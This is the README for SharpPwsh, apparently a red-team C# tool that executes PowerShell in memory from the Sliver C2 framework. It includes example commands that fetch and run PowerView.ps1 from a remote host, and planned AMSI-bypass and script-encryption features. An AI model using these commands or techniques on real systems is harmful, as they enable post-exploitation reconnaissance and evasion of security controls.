# SharpPwsh
C# .Net Framework program that uses `RunspaceFactory` for Powershell command execution.

## Features
- Execute Powershell commands
- Load & execute remote script

## Examples

```
# execute powershell command
sliver > execute-assembly -i /home/hacker/SharpPwsh.exe -c whoami

# load remote script and execute
sliver > execute-assembly -i /home/hacker/SharpPwsh.exe -u http://x.x.x.x/PowerView.ps1 -c get-netlocalgroup
```

## Planned
- Load & execute embedded script
- Load & execute script from disk
- Load & execute script from clipboard
- Compression & encryption support for scripts
- AMSI Bypass
- Multiple command support

## Build
Built using .NET Framework v4.5.1 in Visual Studio 2019.

**Be sure to add `c:\windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll` as a reference.**